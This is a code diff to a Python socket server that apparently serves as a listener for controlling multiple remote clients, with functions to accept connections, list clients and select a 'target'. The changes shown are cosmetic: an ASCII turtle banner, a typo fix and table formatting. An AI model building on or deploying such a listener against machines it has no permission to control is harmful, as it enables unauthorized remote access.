@@ -1,6 +1,7 @@
 import socket
 import threading
 import time
+import sys
 from queue import Queue
 
 NUMBER_OF_THREADS = 2
@@ -9,7 +10,22 @@ queue = Queue()
 all_connections = []
 all_addresses = []
 
+def draw_turtle():
+	sys.stdout.write("  _____     ____\n")
+	sys.stdout.write(" /      \  |  o |\n")
+	sys.stdout.write("|        |/ ___\| \n")
+	sys.stdout.write("|_________/  \n")
+	sys.stdout.write("|_|_| |_|_|\n")
+	
+	'''
+	  _____     ____
+     /      \  |  o | 
+	|        |/ ___\| 
+	|_________/     
+	|_|_| |_|_|
 
+	'''
+draw_turtle()
 # Create socket
 def socket_create():
 	try:
@@ -47,7 +63,7 @@ def accept_connections():
 			conn.setblocking(1)
 			all_connections.append(conn)
 			all_addresses.append(address)
-			print("\nConnection has beemn established: " + address[0])
+			print("\nConnection has been established: " + address[0])
 		except:
 			print("Error accepting connections")
 
@@ -75,8 +91,8 @@ def list_connections():
 			del all_connections[i]
 			del all_addresses[i]
 			continue
-		results += str(i) + '	' + str(all_addresses[i][0]) + '	' + str(all_addresses[i][1]) + '\n'
-	print('------- Clients -------' + '\n' + results)
+		results += str(i) + '   ' + str(all_addresses[i][0]) + '  ' + str(all_addresses[i][1]) + '\n'
+	print('--------- Clients ---------' + '\n' + results)
 
 # Select a target client
 def get_target(cmd):
